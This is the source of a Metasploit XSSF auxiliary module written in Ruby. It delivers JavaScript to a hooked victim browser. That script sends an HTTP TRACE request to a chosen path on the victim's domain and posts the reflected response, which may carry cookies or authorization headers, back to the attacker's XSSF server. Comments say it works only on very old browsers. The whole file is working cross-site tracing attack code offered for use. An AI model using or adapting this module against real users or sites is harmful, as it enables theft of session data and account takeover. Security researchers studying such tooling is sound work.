require 'msf/core'
require 'msf/base/xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
# /!\ This modules only works with very very very old browsers (ie <= 6, ff <= 2.2)
# New ones will block the request for security concerns
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'HTTP TRACE Method',
			'Description' => 'Return result of TRACE method over given domain if activated (for very old browsers)'
		))
		
		register_options(
			[
				OptString.new('path', [true, "TRACE path", '/'])
			], self.class
		)
	end

	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		code = %Q{
			XSSF_XHR.open('TRACE', '#{datastore['path']}', false);
			XSSF_XHR.send(null);
			
			XSSF_POST(XSSF_XHR.responseText, #{self.name});
		}
		
		send_response(cli, code)
	end
end